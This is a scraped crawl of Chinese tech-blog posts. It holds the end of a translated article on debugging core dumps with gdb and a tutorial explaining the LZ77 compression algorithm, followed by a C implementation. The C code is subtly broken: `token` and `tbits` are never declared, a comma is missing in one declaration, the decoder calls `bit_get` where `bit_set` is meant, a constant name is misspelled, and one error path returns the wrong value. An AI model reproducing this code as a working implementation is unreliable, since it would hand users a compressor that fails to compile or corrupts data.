<code>valgrind</code></li>\n</ol>\n<p>如果那没用，或者你想要拿到一个核心转储来调查：</p>\n<ol>\n<li>确保二进制文件编译时带有调试符号信息；</li>\n<li>正确的设置 <code>ulimit</code> 和 <code>kernel.core_pattern</code>；</li>\n<li>运行程序；</li>\n<li>一旦你用 <code>gdb</code> 调试核心转储了，加载符号并运行 <code>bt</code>；</li>\n<li>尝试找出发生了什么！</li>\n</ol>\n<p>我可以使用 <code>gdb</code> 弄清楚有个 C++ 的虚表条目指向一些被破坏的内存，这有点帮助，并且使我感觉好像更懂了 C++ 一点。也许有一天我们会更多地讨论如何使用 <code>gdb</code> 来查找问题！</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114211\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114211votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114211\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "IT技术,Linux", "author": "Julia Evans", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"}
{"title": "数据压缩算法---LZ77算法 的分析与实现", "createdate": "2018/07/17", "url": "http://blog.jobbole.com/114214/", "url_object_id": "569d347b7faf6939bbf51a1b0f5d5c37", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/95f95341b03e66babaadc935b51d6a24.jpg"], "thumbs": 1, "bookmark": null, "comments": null, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/idreamo/p/9249367.html\">IDreamo</a>   </div><h3>LZ77简介</h3>\n<p>Ziv和Lempel于1977年发表题为“顺序数据压缩的一个通用算法（A Universal Algorithm for Sequential Data Compression ）”的论文，论文中描述的算法被后人称为LZ77算法。值得说的是，LZ77严格意义上来说不是一种算法，而是一种编码理论。同Huffman编码一样，只定义了原理，并没有定义如何实现。<strong>基于这种理论来实现的算法才称为LZ77算法，或者人们更愿意称为LZ77变种。</strong>实际上这类算法已经有很多了，比如LZSS、LZB、LZH等。至今，几乎我们日常使用的所有通用压缩工具，象ARJ，PKZip，WinZip，LHArc，RAR，GZip，ACE，ZOO，TurboZip，Compress，JAR„„甚至许多硬件如网络设备中内置的压缩算法，无一例外，都可以最终归结为这两个以色列人的杰出贡献。</p>\n<p><strong>LZ77是一种基于字典的算法，它将长字符串（也称为短语）编码成短小的标记，用小标记代替字典中的短语，从而达到压缩的目的。也就是说，它通过用小的标记来代替数据中多次重复出现的长串方法来压缩数据。其处理的符号不一定是文本字符，可以是任意大小的符号。</strong></p>\n<h3>短语字典的维护</h3>\n<p>不同的基于字典的算法使用不同的方法来维护它们的字典。<strong>LZ77使用的是一个前向缓冲区和一个滑动窗口</strong>。</p>\n<p><strong>LZ77首先将一部分数据载入前向缓冲区</strong>。为了便于理解前向缓冲区如何存储短语并形成字典，我们将缓冲区描绘成S<sub>1</sub>，…，S<sub>n</sub>的字符序列，P<sub>b</sub>是由字符组成的短语集合。从字符序列S<sub>1</sub>，…，S<sub>n</sub>，组成n个短语，定义如下：</p>\n<p>P<sub>b</sub> = {(S<sub>1</sub>),(S<sub>1</sub>,S<sub>2</sub>),…,(S<sub>1</sub>,…,S<sub>n</sub>)}</p>\n<p>例如，如果前向缓冲区包含字符(A,B,D)，那么缓冲区中的短语为{(A),(A,B),(A,B,D)}。</p>\n<p><strong>一旦数据中的短语通过前向缓冲区，那么它将移动到滑动窗口中，并变成字典的一部分。</strong>为理解短语是如何在滑动窗口中表示的，首先，把窗口想象成S<sub>1</sub>，…，S<sub>m</sub>的字符序列，且P<sub>w</sub>是由这些字符组成的短语集合。从序列S<sub>1</sub>，…，S<sub>m</sub>产生短语数据集合的过程如下：</p>\n<p>P<sub>w</sub> = {P<sub>1</sub>,P<sub>2</sub>,…,P<sub>m</sub>}，其中P<sub>i</sub> = {(S<sub>i</sub>),(S<sub>i</sub>,S<sub>i</sub>+1),…,(S<sub>i</sub>,S<sub>i</sub>+1,…,S<sub>m</sub>)}</p>\n<p>例如，如果滑动窗口中包含符号(A,B,C)，那么窗口和字典中的短语为{(A),(A,B),(A,B,C),(B),(B,C),(C)}。</p>\n<p><strong>LZ77算法的主要思想就是在前向缓冲区中不断寻找能够与字典中短语匹配的最长短语。</strong>以上面描述的前向缓冲区和滑动窗口为例，其最长的匹配短语为(A,B)。</p>\n<h3>压缩和解压缩数据</h3>\n<p>前向缓冲区和滑动窗口之间的匹配有两种情况：要么找到一个匹配短语，要么找不到匹配的短语。当找到最长的匹配时，将其编码成短语标记。</p>\n<p><strong>短语标记包含三个部分：1、滑动窗口中的偏移量（从头部到匹配开始的前一个字符）；2、匹配中的符号个数；3、匹配结束后，前向缓冲区中的第一个符号。</strong></p>\n<p>当没有找到匹配时，将未匹配的符号编码成符号标记。这个符号标记仅仅包含符号本身，没有压缩过程。事实上，我们将看到符号标记实际上比符号多一位，所以会出现轻微的扩展。</p>\n<p>一旦把n个符号编码并生成相应的标记，就将这n个符号从滑动窗口的一端移出，并用前向缓冲区中同样数量的符号来代替它们。然后，重新填充前向缓冲区。这个过程使滑动窗口中始终有最新的短语。滑动窗口和前向缓冲区具体维护的短语数量由它们自身的容量决定。</p>\n<p>下图（1）展示了用LZ77算法压缩字符串的过程，其中滑动窗口大小为8个字节，前向缓冲区大小为4个字节。在实际中，滑动窗口典型的大小为4KB（4096字节）。前向缓冲区大小通常小于100字节。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/370380549f00cdef220ed43b273bcd2b.png\" alt=\"\"></p>\n<p style=\"text-align: center\">图（1）：使用LZ77算法对字符串ABABCBABABCAD进行压缩</p>\n<p>我们通过解码标记和保持滑动窗口中符号的更新来解压缩数据，其过程类似于压缩过程。<strong>当解码每个标记时，将标记编码成字符拷贝到滑动窗口中。每当遇到一个短语标记时，就在滑动窗口中查找相应的偏移量，同时查找在那里发现的指定长度的短语。每当遇到一个符号标记时，就生成标记中保存的一个符号。</strong>下图（2）展示了解压缩图（1）中数据的过程。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/53b421fbf28829eb0fc8cfc38c1f8c96.png\" alt=\"\"></p>\n<p style=\"text-align: center\">图（2）：使用LZ77算法对图（1）中压缩的字符串进行解压缩</p>\n<h3>LZ77的效率</h3>\n<p>用LZ77算法压缩的程度取决于很多因素，例如，选择滑动窗口的大小，为前向缓冲区设置的大小，以及数据本身的熵。最终，压缩的程度取决于能匹配的短语的数量和短语的长度。大多数情况下，LZ77比霍夫曼编码有着更高的压缩比，但是其压缩过程相对较慢。</p>\n<p>用LZ77算法压缩数据是非常耗时的，国为要花很多时间寻找窗口中的匹配短语。然而在通常情况下，LZ77的解压缩过程要比霍夫曼编码的解压缩过程耗时要少。LZ77的解压缩过程非常快是因为每个标记都明确地告诉我们在缓冲区中哪个位置可以读取到所需要的符号。事实上，我们最终只从滑动窗口中读取了与原始数据数量相等的符号而已。</p>\n<h3>LZ77的接口定义</h3>\n<p><strong>lz77_compress</strong></p>\n<hr>\n<p><strong>int lz77_compress(const unsigned char *original, unsigned char **compressed, int size);</strong></p>\n<p>返回值：如果数据压缩成功，返回压缩后数据的字节数；否则返回-1；</p>\n<p>描述：   用LZ77算法压缩缓冲区original中的数据，original包含size个字节的空间。压缩后的数据存入缓冲区compressed中。lz77_compress需要调用malloc来动态的为compressed分配存储空间，当这块空间不再使用时，由调用者调用函数free来释放空间。</p>\n<p>复杂度：O(n)，其中n是原始数据中符号的个数。</p>\n<p><strong>lz77_uncompress</strong></p>\n<hr>\n<p><strong>int lz77_uncompress(const unsigned char *compressed, unsigned char **original);</strong></p>\n<p>返回值：如果解压缩数据成功，返回恢复后数据的字节数；否则返回-1；</p>\n<p>描述：   用LZ77算法解压缩缓冲区compressed中的数据。假定缓冲区包含的数据之前由lz77_compress压缩。恢复后的数据存入缓冲区original中。lz77_uncompress函数调用malloc来动态的为original分配存储空间。当这块存储空间不再使用时，由调用者调用函数free来释放空间。</p>\n<p>复杂度：O（n）其中n是原始数据中符号的个数。</p>\n<h3>LZ77的实现与分析</h3>\n<p>LZ77算法，通过一个滑动窗口将前向缓冲区中的短语编码成相应的标记，从而达到压缩的目的。在解压缩的过程中，将每个标记解码成短语或符号本身。要做到这些，必须要不断地更新窗口，这样，在压缩过程中的任何时刻，窗口都能按照规则进行编码。在本节所有的示例中，原始数据中的一个符号占一个字节。</p>\n<p><strong>lz77_compress</strong></p>\n<p><strong>lz77_compress操作使用LZ77算法来压缩数据。</strong>首先，它将数据中的符号写入压缩数据的缓冲区中，并同时初始化滑动窗口和前向缓冲区。随后，前向缓冲区将用来加载符号。</p>\n<p>压缩发生在一个循环中，循环会持续迭代直到处理完所有符号。使用ipos来保存原始数据中正在处理的当前字节，并用opos来保存向压缩数据缓冲区写入的当前位。在循环的每次迭代中，调用compare_win来确定前向缓冲区与滑动窗口中匹配的最长短语。函数compare_win返回最长匹配串的长度。</p>\n<p>当找到一个匹配串时，compare_win设置offset为滑动窗口中匹配串的位置，同时设置next为前向缓冲区中匹配串后一位的符号。在这种情况下，向压缩数据中写入一个短语标记（如图3-a）。在本节展示的实现中，对于偏移量offset短语标记需要12位，这是因为滑动窗口的大小为4KB（4096字节）。此时短语标志需要5位来表示长度，因为在一个32字节的前向缓冲区中，不会有匹配串超过这个长度。当没有找到匹配串时，compare_win返回，并且设置next为前向缓冲区起始处未匹配的符号。在这种情况下，向压缩数据中写入一个符号（如图3-b）。无论向压缩数据中写入的是一个短语还是一个符号，在实际写入标记之前，都需要调用网络函数htonl来转换串，以保证标记是大端格式。这种格式是在实际压缩数据和解压缩数据时所要求的。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/747fcf6077eb0f28fa191a2299ec991e.png\" alt=\"\"></p>\n<p style=\"text-align: center\">图3：LZ77中的短语标记（A）和符号标记（B）的结构</p>\n<p>一旦将相应的标记写入压缩数据的缓冲区中，就调整滑动窗口和前向缓冲区。要使数据通过滑动窗口，将数据从右边滑入窗口，从左边滑出窗口。同样，在前向缓冲区中也是相同的滑动过程。移动的字节数与标记中编码的字符数相等。</p>\n<p>lz77_compress的时间复杂度为O(n)，其中n是原始数据中符号的个数。这是因为，对于数据中每个n/c个编码的标记，其中1/c是一个代表编码效率的常量因素，调用一次compare_win。函数compare_win运行一段固定的时间，因为滑动窗口和前向缓冲区的大小均为常数。然而，这些常量比较大，会对lz77_compress的总体运行时间产生较大的影响。所以，lz77_compress的时间复杂度是O(n)，但其实际的复杂度会受其常量因子的影响。这就解释了为什么在用lz77进行数据压缩时速度非常慢。</p>\n<p><strong>lz77_uncompress</strong></p>\n<p><strong>lz77_uncompress操作解压缩由lz77_compress压缩的数据。</strong>首先，该函数从压缩数据中读取字符，并初始化滑动窗口和前向缓冲区。</p>\n<p>解压缩过程在一个循环中执行，此循环会持续迭代执行直到所有的符号处理完。使用ipos来保存向压缩数据中写入的当前位，并用opos来保存写入恢复数据缓冲区中当前字节。在循环的每次迭代过程中，首先从压缩数据读取一位来确定要解码的标记类型。</p>\n<p>在解析一个标记时，如果读取的首位是1，说明遇到了一个短语标记。此时读取它的每个成员，查找滑动窗口中的短语，然后将短语写入恢复数据缓冲区中。当查找每个短语时，调用网络函数ntohl来保证窗口中的偏移量和长度的字节顺序是与操作系统匹配的。这个转换过程是必要的，因为从压缩数据中读取出来的偏移量和长度是大端格式的。在数据被拷贝到滑动窗口之前，前向缓冲区被用做一个临时转换区来保存数据。最后，写入该标记编码的匹配的符号。如果读取的标记的首位是0，说明遇到了一个符号标记。在这种情况下，将该标记编码的匹配符号写入恢复数据缓冲区中。</p>\n<p>一旦将解码的数据写入恢复数据的缓冲区中，就调整滑动窗口。要将数据通过滑动窗口，将数据从右边滑入窗口，从左边滑出窗口。移动的字节数与从标记中解码的字符数相等。</p>\n<p>lz77_uncompress的时间复杂度为O(n)，其中n是原始数据中符号的个数。</p>\n<p><strong>示例：LZ77的实现文件 </strong></p>\n<p><strong>(示例所需要的头文件信息请查阅前面的文章：<a href=\"https://www.cnblogs.com/idreamo/p/9153691.html\" target=\"_blank\">数据压缩的重要组成部分–位操作</a>)</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7bc4732a6740937600\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n/*lz77.c*/\r\n#include &lt;netinet/in.h&gt;\r\n#include &lt;stdlib.h&gt;\r\n#include &lt;string.h&gt;\r\n\r\n#include \"bit.h\"\r\n#include \"compress.h\"\r\n\r\n/*compare_win 确定前向缓冲区中与滑动窗口中匹配的最长短语*/\r\nstatic int compare_win(const unsigned char *window, const unsigned char *buffer,\r\n                       int *offset, unsigned char *next)\r\n{\r\n    int match,longest,i,j,k;\r\n\r\n    /*初始化偏移量*/\r\n    *offset = 0;\r\n\r\n    /*如果没有找到匹配，准备在前向缓冲区中返回0和下一个字符*/\r\n    longest = 0;\r\n    *next = buffer[0];\r\n\r\n    /*在前向缓冲区和滑动窗口中寻找最佳匹配*/\r\n    for(k=0; k&lt;LZ77_WINDOW_SIZE; k++)\r\n    {\r\n        i = k;\r\n        j = 0;\r\n        match = 0;\r\n\r\n        /*确定滑动窗口中k个偏移量匹配的符号数*/\r\n        while(i&lt;LZ77_WINDOW_SIZE &amp;&amp; j&lt;LZ77_BUFFER_SIZE - 1)\r\n        {\r\n            if(window[i] != buffer[j])\r\n                break;\r\n\r\n            match++;\r\n            i++;\r\n            j++;\r\n        }\r\n\r\n        /*跟踪最佳匹配的偏移、长度和下一个符号*/\r\n        if(match &gt; longest)\r\n        {\r\n            *offset = k;\r\n            longest = match;\r\n            *next = buffer[j];\r\n        }\r\n    }\r\n    return longest;\r\n}\r\n\r\n/*lz77_compress  使用lz77算法压缩数据*/\r\nint lz77_compress(const unsigned char *original,unsigned char **compressed,int size)\r\n{\r\n    unsigned char     window[LZ77_WINDOW_SIZE],\r\n                      buffer[LZ77_BUFFER_SIZE],\r\n                      *comp,\r\n                      *temp,\r\n                      next;\r\n    int               offset,\r\n                      length,\r\n                      remaining,\r\n                      hsize,\r\n                      ipos,\r\n                      opos,\r\n                      tpos,\r\n                      i;\r\n    /*使指向压缩数据的指针暂时无效*/\r\n    *compressed = NULL;\r\n\r\n    /*写入头部信息*/\r\n    hsize = sizeof(int);\r\n    if((comp = (unsigned char *)malloc(hsize)) == NULL)\r\n        return -1;\r\n    memcpy(comp,&amp;size,sizeof(int));\r\n\r\n    /*初始化滑动窗口和前向缓冲区(用0填充)*/\r\n    memset(window, 0 , LZ77_WINDOW_SIZE);\r\n    memset(buffer, 0 , LZ77_BUFFER_SIZE);\r\n\r\n    /*加载前向缓冲区*/\r\n    ipos = 0;\r\n\r\n    for(i=0; i&lt;LZ77_BUFFER_SIZE &amp;&amp; ipos &lt; size; i++)\r\n    {\r\n        buffer[i] = original[ipos];\r\n        ipos++;\r\n    }\r\n\r\n    /*压缩数据*/\r\n    opos = hsize * 8;\r\n    remaining = size;\r\n\r\n    while(remaining &gt; 0)\r\n    {\r\n        if((length = compare_win(window,buffer,&amp;offset,&amp;next)) != 0)\r\n        {\r\n            /*编码短语标记*/\r\n            token = 0x00000001 &lt;&lt; (LZ77_PHRASE_BITS - 1);\r\n\r\n            /*设置在滑动窗口找到匹配的偏移量*/\r\n            token = token | (offset &lt;&lt; (LZ77_PHRASE_BITS - LZ77_TYPE_BITS - LZ77_WINOFF_BITS));\r\n\r\n            /*设置匹配串的长度*/\r\n            token = token | (length &lt;&lt; (LZ77_PHRASE_BITS - LZ77_TYPE_BITS - LZ77_WINOFF_BITS - LZ77_BUFLEN_BITS));\r\n\r\n            /*设置前向缓冲区中匹配串后面紧邻的字符*/\r\n            token = token | next;\r\n\r\n            /*设置标记的位数*/\r\n            tbits = LZ77_PHRASE_BITS;\r\n        }\r\n        else\r\n        {\r\n            /*编码一个字符标记*/\r\n            token = 0x00000000;\r\n\r\n            /*设置未匹配的字符*/\r\n            token = token | next;\r\n\r\n            /*设置标记的位数*/\r\n            tbits = LZ77_SYMBOL_BITS;\r\n        }\r\n\r\n        /*确定标记是大端格式*/\r\n        token = htonl(token);\r\n\r\n        /*将标记写入压缩缓冲区*/\r\n        for(i=0; i&lt;tbits; i++)\r\n        {\r\n            if(opos % 8 == 0)\r\n            {\r\n                /*为压缩缓冲区分配临时空间*/\r\n                if((temp = (unsigned char *)realloc(comp,(opos / 8) + 1)) == NULL)\r\n                {\r\n                    free(comp);\r\n                    return -1;\r\n                }\r\n                comp = temp;\r\n            }\r\n\r\n            tpos = (sizeof(unsigned long ) * 8) - tbits + i;\r\n            bit_set(comp,opos,bit_get((unsigned char *)&amp;token,tpos));\r\n            opos++;\r\n        }\r\n        /*调整短语长度*/\r\n        length++;\r\n\r\n        /*从前向缓冲区中拷贝数据到滑动窗口中*/\r\n        memmove(&amp;window[0],&amp;window[length],LZ77_WINDOW_SIZE - length);\r\n        memmove(&amp;window[LZ77_WINDOW_SIZE - length],&amp;buffer[0],length);\r\n        memmove(&amp;buffer[0],&amp;buffer[length],LZ77_BUFFER_SIZE - length);\r\n        /*向前向缓冲区中读取更多数据*/\r\n        for(i = LZ77_BUFFER_SIZE - length; i&lt;LZ77_BUFFER_SIZE &amp;&amp; ipos &lt;size; i++)\r\n        {\r\n            buffer[i] = original[ipos];\r\n            ipos++;\r\n        }\r\n\r\n        /*调整剩余未匹配的长度*/\r\n        remaining = remaining - length;\r\n    }\r\n    /*指向压缩数据缓冲区*/\r\n    *compressed = comp;\r\n    /*返回压缩数据中的字节数*/\r\n    return ((opos - 1) / 8) + 1;\r\n}\r\n\r\n/*lz77_uncompress  解压缩由lz77_compress压缩的数据*/\r\nint lz77_uncompress(const unsigned char *compressed,unsigned char **original)\r\n{\r\n    unsigned char window[LZ77_WINDOW_SIZE],\r\n                  buffer[LZ77_BUFFER_SIZE]\r\n                  *orig,\r\n                  *temp,\r\n                  next;\r\n    int           offset,\r\n                  length,\r\n                  remaining,\r\n                  hsize,\r\n                  size,\r\n                  ipos,\r\n                  opos,\r\n                  tpos,\r\n                  state,\r\n                  i;\r\n    /*使指向原始数据的指针暂时无效*/\r\n    *original = orig = NULL;\r\n\r\n    /*获取头部信息*/\r\n    hsize = sizeof(int);\r\n    memcpy(&amp;size,compressed,sizeof(int));\r\n\r\n    /*初始化滑动窗口和前向缓冲区*/\r\n    memset(window, 0, LZ77_WINDOW_SIZE);\r\n    memset(buffer, 0, LZ77_BUFFER_SIZE);\r\n\r\n    /*解压缩数据*/\r\n    ipos = hsize * 8;\r\n    opos = 0;\r\n    remaining = size;\r\n\r\n    while(remaining &gt; 0)\r\n    {\r\n        /*获取压缩数据中的下一位*/\r\n        state = bit_get(compressed,ipos);\r\n        ipos++;\r\n\r\n        if(state == 1)\r\n        {\r\n            /*处理的是短语标记*/\r\n            memset(&amp;offset, 0, sizeof(int));\r\n\r\n            for(i=0; i&lt;LZ77_WINOFF_BITS; i++)\r\n            {\r\n                tpos = (sizeof(int)*8) - LZ77_WINOFF_BITS + i;\r\n                bit_set((unsigned char *)&amp;offset, tpos, bit_get(compressed,ipos));\r\n                ipos++;\r\n            }\r\n\r\n            memset(&amp;length, 0, sizeof(int));\r\n            for(i=0; i&lt;LZ77_BUFLEN_BITS; i++)\r\n            {\r\n                tpos = (sizeof(int)*8) - LZ77_BUFLEN_BITS + i;\r\n                bit_set((unsigned char *)&amp;length, tpos, bit_get(compressed,ipos));\r\n                ipos++;\r\n            }\r\n\r\n            next = 0x00;\r\n            for(i=0; i&lt;LZ77_NEXT_BITS; i++)\r\n            {\r\n                tpos = (sizeof(unsigned char)*8) - LZ77_NEXT_BITS + i;\r\n                bit_set((unsigned char *)&amp;next, tpos, bit_get(compressed,ipos));\r\n                ipos++;\r\n            }\r\n\r\n            /*确保偏移和长度对系统有正确的字节排序*/\r\n            offset = ntohl(offset);\r\n            length = ntohl(length);\r\n\r\n            /*将短语从滑动窗口写入原始数据缓冲区*/\r\n            i=0;\r\n            if(opos&gt;0)\r\n            {\r\n                if((temp = (unsigned char *)realloc(orig,opos+length+1)) == NULL)\r\n                {\r\n                    free(orig);\r\n                    return 1;\r\n                }\r\n                orig = temp;\r\n            }\r\n            else\r\n            {\r\n                if((orig = (unsigned char *)malloc(length+1)) == NULL)\r\n                    return -1;\r\n            }\r\n\r\n            while(i&lt;length &amp;&amp; remaining&gt;0)\r\n            {\r\n                orig[opos] = window[offset + i];\r\n                opos++;\r\n                /*在前向缓冲区中记录每个符号，直到准备更新滑动窗口*/\r\n                buffer[i] = window[offset + i];\r\n                i++;\r\n\r\n                /*调整剩余符号总数*/\r\n                remaining --;\r\n            }\r\n\r\n            /*将不匹配的符号写入原始数据缓冲区*/\r\n            if(remaining &gt; 0)\r\n            {\r\n                orig[opos] = next;\r\n                opos++;\r\n\r\n                /*仍需在前向缓冲区中记录此符号*/\r\n                buffer[i] = next;\r\n\r\n                /*调整剩余字符总数*/\r\n                remaining--;\r\n            }\r\n            /*调整短语长度*/\r\n            length++;\r\n        }\r\n        else\r\n        {\r\n            /*处理的是字符标记*/\r\n            next = 0x00;\r\n            for(i=0; i&lt;LZ77_NEXT_BITS; i++)\r\n            {\r\n                tpos = (sizeof(unsigned char)*8) - LZ77_NEXT_BITS + i;\r\n                bit_get((unsigned char *)&amp;next, tpos,bit_get(compressed,ipos));\r\n                ipos++;\r\n            }\r\n\r\n            /*将字符写入原始数据缓冲区*/\r\n            if(opos &gt; 0)\r\n            {\r\n                if((temp = (unsigned char*)realloc(orig,opos+1)) == NULL)\r\n                {\r\n                    free(orig);\r\n                    return -1;\r\n                }\r\n                orig = temp;\r\n            }\r\n            else\r\n            {\r\n                if((orig = (unsigned char *)malloc(1)) == NULL)\r\n                return -1;\r\n            }\r\n            orig[opos] = next;\r\n            opos++;\r\n\r\n            /*在前向缓冲区中记录当前字符*/\r\n            if(remaining &gt; 0)\r\n                buffer[0] = next;\r\n            /*调整剩余数量*/\r\n            remaining--;\r\n\r\n            /*设置短语长度为1*/\r\n            length = 1;\r\n        }\r\n        /*复制前向缓冲中的数据到滑动窗口*/\r\n        memmove(&amp;window[0], &amp;window[length],LZ7_WINDOW_BITS - length);\r\n        memmove(&amp;window[LZ77_WINDOW_SIZE - length], &amp;buffer[0], length);\r\n    }\r\n    /*指向原始数据缓冲区*/\r\n    *original = orig;\r\n\r\n    /*返回解压缩的原始数据中的字节数*/\r\n    return  opos;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-44\">44</div><div class=\"crayon-num\" 